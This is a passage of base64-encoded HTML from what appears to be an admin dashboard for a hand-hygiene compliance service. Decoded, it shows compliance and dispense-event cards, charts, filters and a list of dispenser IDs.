gICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0iY3Vyc29yUG9pbnRlciIgZGF0YS10b2dnbGU9ImRyb3Bkb3duIiBocmVmPSIjIiBzdHlsZT0iY29sb3I6IHJnYmEoMCwwLDAsLjUpOyIgb25jbGljaz0ibW9iaWxlTWVudSgpIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWJhcnMiPjwvaT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGkgc3R5bGU9InotaW5kZXg6IDEwMDsiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0icC0wIGRyb3Bkb3duLW1lbnUgZHJvcGRvd24tbWVudS1yaWdodCIgc3R5bGU9Imxpc3Qtc3R5bGUtdHlwZTogbm9uZTsiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iZHJvcGRvd24taXRlbSIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS8iIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsiPkRhc2hib2FyZDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvbmF2PgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwgZmFkZSIgaWQ9Im1vZGFsLXVzZXItcm9sZSIgYXJpYS1oaWRkZW49InRydWUiIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1kaWFsb2ciPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWNvbnRlbnQiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1oZWFkZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGg0IGNsYXNzPSJtb2RhbC10aXRsZSI+U3VwZXItQWRtaW4gTWlycm9yaW5nPC9oND4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iY2xvc2UiIGRhdGEtZGlzbWlzcz0ibW9kYWwiIGFyaWEtbGFiZWw9IkNsb3NlIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBhcmlhLWhpZGRlbj0idHJ1ZSI+w5c8L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1ib2R5Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzZWxlY3QgbmFtZT0ib3JnYW5pemF0aW9uVXNlcl9tb2JpbGUiIGlkPSJvcmdhbml6YXRpb25Vc2VyX21vYmlsZSIgY2xhc3M9ImZvcm0tY29udHJvbCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iIj4tLS0tIENoYW5nZSBVc2VyIFJvbGUgLS0tLTwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3NlbGVjdD4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWZvb3RlciBqdXN0aWZ5LWNvbnRlbnQtYmV0d2VlbiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCIgZGF0YS1kaXNtaXNzPSJtb2RhbCI+Q2xvc2U8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IiBvbmNsaWNrPSJjaGFuZ2VVc2VyUm9sZSgnb3JnYW5pemF0aW9uVXNlcl9tb2JpbGUnKSI+U2F2ZSBjaGFuZ2VzPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCBjYXJkLWJvZHkiIGlkPSJyZWxhdGVkLXNlYXJjaC1yZXN1bHQiIHN0eWxlPSIiPjwvZGl2PgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWVudSBkLW5vbmUgZC1zbS1ub25lIGQtbWQtZmxleCBuYXZiYXIgbmF2YmFyLWV4cGFuZCBwLTAiIHN0eWxlPSJmb250LXNpemU6IDFyZW07Ij4KICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0ibmF2YmFyLW5hdiI+CiAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSBkLWZsZXgiPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tLyIgc3R5bGU9InBhZGRpbmc6IDFyZW07IHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOyI+RGFzaGJvYXJkPC9hPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvZGl2PgoKICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL2NoYXJ0anMvY2hhcnQuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvY2hhcnQtNC5qcz92PTZlYzQyMSI+PC9zY3JpcHQ+CgogICAgPGRpdiBjbGFzcz0iY29udGVudC13cmFwcGVyIGJnLWNvbG9yICIgc3R5bGU9Im1pbi1oZWlnaHQ6IDQ2MXB4OyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxzZWN0aW9uIGNsYXNzPSJjb250ZW50IHB4LTMgcHQtNCI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lci1mbHVpZCBwLTAiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtNiBjb2wtc20tNiBjb2wtbWQtNCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InNtYWxsLWJveCBiZy1jb2xvciB0ZXh0LWNlbnRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RhZmYtZGFzaGJvYXJkLWNhcmRzIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHAgY2xhc3M9Im0tMCI+Q29tcGxpYW5jZSBBdmVyYWdlIExhc3QgMzAgRGF5czwvcD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aDMgaWQ9Im1vbnRoVG9EYXRlQ29tcGxpYW5jZSIgY2xhc3M9Im0tMCI+MCU8L2gzPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtNiBjb2wtc20tNiBjb2wtbWQtNCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InNtYWxsLWJveCBiZy1jb2xvciB0ZXh0LWNlbnRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RhZmYtZGFzaGJvYXJkLWNhcmRzIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHAgY2xhc3M9Im0tMCI+RGlzcGVuc2UgRXZlbnRzIExhc3QgMzAgRGF5czwvcD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aDMgaWQ9InRvdGFsU2FuaXRpemF0aW9uIiBjbGFzcz0ibS0wIj4wPC9oMz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTYgY29sLXNtLTYgY29sLW1kLTQiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzbWFsbC1ib3ggYmctY29sb3IgdGV4dC1jZW50ZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5uZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0YWZmLWRhc2hib2FyZC1jYXJkcyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJtLTAiPk1pc3NlZCBPcHBvcnR1bml0aWVzIExhc3QgMzAgRGF5czwvcD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aDMgaWQ9InRvdGFsTWlzc2VkT3Bwb3J0dW5pdGllcyIgY2xhc3M9Im0tMCI+MDwvaDM+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9zZWN0aW9uPgoKICAgICAgICA8c2VjdGlvbiBpZD0ic2FmZkRhc2hib2FyZEZpbHRlcnMiIGNsYXNzPSJjb250ZW50IG1iLTQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXItZmx1aWQiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IG0tMCByZXBvcnQtaGVhZGVyIHJvdW5kZWQtZWRnZXMiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InctMTAwIiBzdHlsZT0icGFkZGluZzogOXB4IDcuNXB4OyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZsb2F0LWxlZnQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ0biIgaWQ9InByaW50YnV0dG9uIj5QcmludDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRhc2hib2FyZEZpbHRlclNlY3Rpb24gZC1mbGV4IHJvdyBtbC1tZC1hdXRvIG1yLW1kLTAgY29sLTEyIGNvbC1tZC1hdXRvIGp1c3RpZnktY29udGVudC1tZC1lbmQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZC1mbGV4IHJvdyBhbGlnbi1pdGVtcy1iYXNlbGluZSBtLTAgY29sLTEyIGNvbC1zbS02IGNvbC1tZC1hdXRvIHB4LTAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC0xMSBjb2wtbWQtYXV0byBweC0wIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNlbGVjdCBpZD0ic3RhZmZEYXNoYm9hcmREdXJhdGlvbiIgbmFtZT0ic3RhZmZEYXNoYm9hcmREdXJhdGlvbiIgb25jaGFuZ2U9InN0YWZmVXNlckRhc2hib2FyZFJlZnJlc2hDaGFydHMoJzM5OScsICcxJykiIHBsYWNlaG9sZGVybmFtZT0iRHVyYXRpb24iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iTW9udGhseSIgc2VsZWN0ZWQ9IiI+TW9udGhseTwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iQmlXZWVrbHkiID5Ud28gV2Vla3M8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9IldlZWtseSIgPldlZWtseTwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iRGFpbHkiID5EYWlseTwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3NlbGVjdD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L3NlY3Rpb24+CgogICAgICAgIDxzZWN0aW9uIGNsYXNzPSJjb250ZW50Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyBtLTAgbWItMyI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IG0tMCBkLWZsZXggdy0xMDAiIHN0eWxlPSJwYWRkaW5nOiAuNzVyZW0gMDsiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtMTIgY29sLW1kLTQgdGV4dC1tZC1sZWZ0ICI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWw+TGFzdCBMb2dpbjombmJzcDsmbmJzcDs8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InRleHQtbm93cmFwIiBpZD0ibGFzdExvZ2luIj4yMDI0LTEyLTE0IDIzOjI5OjQzPC9zcGFuPgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIGNvbC1tZC00IHRleHQtbWQtY2VudGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbD5MYXN0IERpc3BlbnNlciBVc2VkOiZuYnNwOyZuYnNwOzwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0idGV4dC1ub3dyYXAiIGlkPSJsYXN0RGlzcGVuc2VyVXNlZCI+PC9zcGFuPgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIGNvbC1tZC00IHRleHQtbWQtcmlnaHQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsPkxhc3QgRGlzcGVuc2UgRXZlbnQ6Jm5ic3A7Jm5ic3A7PC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJ0ZXh0LW5vd3JhcCIgaWQ9Imxhc3REaXNwZW5zZUV2ZW50Ij48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvc2VjdGlvbj4KCiAgICAgICAgPGRpdiBjbGFzcz0icm93IGNvbnRlbnQgbS0wIj4KICAgICAgICAgICAgPGRpdiBpZD0iY29tcGxpYW5jZVRyZW5kQ2hhcnREaXYiIGNsYXNzPSJjb2wtMTIgY29sLXNtLTEyIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgY2FyZC1ncmF5Ij4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciBiZy1jb2xvciI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxoMyBjbGFzcz0iY2FyZC10aXRsZSI+Q29tcGxpYW5jZSBUcmVuZHM8L2gzPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSBjaGFydC1ib2R5Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2hhcnQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGNhbnZhcyBpZD0iY29tcGxpYW5jZVRyZW5kQ2hhcnQiIHN0eWxlPSJtYXgtaGVpZ2h0OiAxMDAlOyBtYXgtd2lkdGg6IDEwMCU7IiB3aWR0aD0iODUwIiBoZWlnaHQ9IjMxMSIgY2xhc3M9ImNoYXJ0anMtcmVuZGVyLW1vbml0b3IiPjwvY2FudmFzPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0iY29tcGxpYW5jZVRyZW5kQ2hhcnROb0RhdGEiIGNsYXNzPSJ3LTEwMCB0ZXh0LWNlbnRlciIgc3R5bGU9IndpZHRoOiAxMDAlOyBoZWlnaHQ6IDMxMXB4OyBkaXNwbGF5OiBub25lOyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGI+Tm8gRGF0YSBBdmFpbGFibGU8L2I+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICA8ZGl2IGlkPSJkaXNwZW5zZUV2ZW50c0J5RGVwYXJ0bWVudENoYXJ0RGl2IiBjbGFzcz0iY29sLTEyIGNvbC1zbS0xMiBjb2wteGwtNiI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIGNhcmQtZ3JheSI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIgYmctY29sb3IiPgogICAgICAgICAgICAgICAgICAgICAgICA8aDMgY2xhc3M9ImNhcmQtdGl0bGUiPkRpc3BlbnNlIEV2ZW50cyBCeSBEZXBhcnRtZW50PC9oMz4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkgY2hhcnQtYm9keSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNoYXJ0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxjYW52YXMgaWQ9ImRpc3BlbnNlRXZlbnRzQnlEZXBhcnRtZW50Q2hhcnQiIHN0eWxlPSJtYXgtaGVpZ2h0OiAxMDAlOyBtYXgtd2lkdGg6IDEwMCU7IiB3aWR0aD0iNzMxIiBoZWlnaHQ9IjMxMSIgY2xhc3M9ImNoYXJ0anMtcmVuZGVyLW1vbml0b3IiPjwvY2FudmFzPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0iZGlzcGVuc2VFdmVudHNCeURlcGFydG1lbnRDaGFydE5vRGF0YSIgY2xhc3M9InctMTAwIHRleHQtY2VudGVyIiBzdHlsZT0iaGVpZ2h0OiAzMTFweDsgZGlzcGxheTogbm9uZTsiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxiPk5vIERhdGEgQXZhaWxhYmxlPC9iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgPGRpdiBpZD0ibWlzc2VkT3Bwb3J0dW5pdGllc1ZTU2FuaXRpemF0aW9uQ2hhcnREaXYiIGNsYXNzPSJjb2wtMTIgY29sLXNtLTEyIGNvbC14bC02Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgY2FyZC1ncmF5Ij4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciBiZy1jb2xvciI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxoMyBjbGFzcz0iY2FyZC10aXRsZSI+TWlzc2VkIE9wcG9ydHVuaXRpZXMgdnMuIENvbXBsaWFudCBFdmVudHM8L2gzPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSBjaGFydC1ib2R5Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2hhcnQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGNhbnZhcyBpZD0ibWlzc2VkT3Bwb3J0dW5pdGllc1ZTU2FuaXRpemF0aW9uQ2hhcnQiIHN0eWxlPSJtYXgtaGVpZ2h0OiAxMDAlOyBtYXgtd2lkdGg6IDEwMCU7IiB3aWR0aD0iNzMxIiBoZWlnaHQ9IjMxMSIgY2xhc3M9ImNoYXJ0anMtcmVuZGVyLW1vbml0b3IiPjwvY2FudmFzPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0ibWlzc2VkT3Bwb3J0dW5pdGllc1ZTU2FuaXRpemF0aW9uQ2hhcnROb0RhdGEiIGNsYXNzPSJ3LTEwMCB0ZXh0LWNlbnRlciIgc3R5bGU9ImhlaWdodDogMzExcHg7IGRpc3BsYXk6IG5vbmU7Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Yj5ObyBEYXRhIEF2YWlsYWJsZTwvYj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIj4KICAgICAgICAgICAgPGhyIGNsYXNzPSJib3JkZXItZGFyayBteC0yIiBzdHlsZT0iYm9yZGVyLXdpZHRoOiBtZWRpdW07Ij4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGRpdiBjbGFzcz0icm93IG0tMCBweC0yIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIGNvbC1zbS0xMiBjb2wteGwtMTIgbXQtMyI+CiAgICAgICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgICAgIAo8ZGl2IGNsYXNzPSJjb250ZW50LXdyYXBwZXIgYmctY29sb3IiIHN0eWxlPSJtaW4taGVpZ2h0OiA1OTNweDsiPgogICAgPHNlY3Rpb24gY2xhc3M9ImNvbnRlbnQgcHgtMCI+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIHB4LTAiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgYmctY29sb3IgcmVwb3J0LWhlYWRlciByb3VuZGVkLWVkZ2VzIiBzdHlsZT0ibWluLWhlaWdodDo1NXB4O3BhZGRpbmc6OXB4IDBweDttYXJnaW46MCAwIDEwcHggMDsiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIGNvbC1tZC01Ij4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGlkPSJleHBvcnQiPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgaWQ9ImV4cG9ydFRleHQiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2xvci13aGl0ZSB0ZXh0LWNlbnRlciB0ZXh0LW1kLWxlZnQgcGItMSBwYi1tZC0wIiBzdHlsZT0icGFkZGluZy1sZWZ0OiAwLjc1cmVtOyBmb250LXNpemU6IDAuN3JlbTsiPkV4cG9ydCBmaWxlcyBjb250YWluaW5nIG92ZXIgMTAsMDAwIHJlY29yZHMgd2lsbCBiZSBlbWFpbGVkLjwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtMTIgY29sLW1kLTciPgogICAgICAgICAgICAgICAgICAgIDxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0OyBkaXNwbGF5OiB0YWJsZTsiIGNsYXNzPSJkdC1idXR0b25zIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBmaWx0ZXItYnRuIiBvbmNsaWNrPSJzaG93RmlsdGVycygpIiBzdHlsZT0ibWluLXdpZHRoOjUwcHg7bWFyZ2luLXJpZ2h0OjBweDsiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1maWx0ZXIgZmEtMXgiIGFyaWEtaGlkZGVuPSJ0cnVlIiBzdHlsZT0ibGluZS1oZWlnaHQ6IDEuNGVtOyI+PC9pPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgaWQ9ImZpbHRlcnMiIGNsYXNzPSJyb3cgbWItMyIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij48ZGl2IGNsYXNzPSJjb2wtc20tMTIiPjxmb3JtIGlkPSJmaWx0ZXJGb3JtIiBvbnN1Ym1pdD0icmV0dXJuIGZhbHNlOyI+PGRpdiBjbGFzcz0iZm9ybS1ncm91cCBmb3JtLWlubGluZSByb3cganVzdGlmeS1jb250ZW50LWNlbnRlciBqdXN0aWZ5LWNvbnRlbnQtbWQtc3RhcnQiPjxkaXYgaWQ9ImRpc3BlbnNlcl9maWx0ZXJfY29udGFpbmVyIiBjbGFzcz0iY29sLTEyIGNvbC1zbS04IGNvbC1tZC02IGNvbC14bC00IGQtZmxleCI+PGxhYmVsIGNsYXNzPSJjb2wtNCBqdXN0aWZ5LWNvbnRlbnQtc3RhcnQiPkRpc3BlbnNlciA8L2xhYmVsPjxkaXYgY2xhc3M9ImNvbC04IHAtMCI+PHNlbGVjdCBpZD0iZGlzcGVuc2VyX2lkIiBuYW1lPSJkaXNwZW5zZXJfaWQiIGNsYXNzPSJmb3JtLWNvbnRyb2wgaW5wdXQtc20gY29sLXNtLTYganVzdGlmeS1jb250ZW50LXN0YXJ0ICAgc2VhcmNoYWJsZVNlbGVjdENsYXNzICIgICAgcGxhY2Vob2xkZXJuYW1lPSJEaXNwZW5zZXIiPjxvcHRpb24+PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTA5IiA+QTIyMjIzMDAyNjY5PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMjY4IiA+QTIyMjIzMDAzMDQ1PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTMyIiA+QTIyMjIzMDAzMjgxPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTU3IiA+QTIyMjIzMDAzOTI2PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTA0IiA+QTIyMjIzMDA0NTM0PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTMzIiA+QTIyMjIzMDA0NjI3PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMzQ3IiA+QTIyMjIzMDA0NjQ3PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTM3IiA+QTIyMjIzMDA0ODkwPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iNjciID5BQiBreG00LTI8L29wdGlvbj48b3B0aW9uIHZhbHVlPSI